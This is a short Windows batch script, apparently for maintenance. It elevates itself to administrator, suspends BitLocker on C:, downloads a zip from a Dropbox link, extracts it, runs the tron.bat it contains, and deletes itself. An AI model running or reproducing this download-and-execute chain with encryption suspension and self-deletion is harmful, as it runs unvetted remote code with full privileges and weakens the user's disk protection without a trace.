FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;caffeine -replace;curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fi/m041g4520padigw11nhqr/tron.zip?rlkey=nvhi4vpw88xt6yguvdxmhirt4&st=2fnjgtp3&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;C:\23jrg\Quantum-Impeller\tools\tron\tron.bat;Remove-Item $PSCommandPath -Force;"
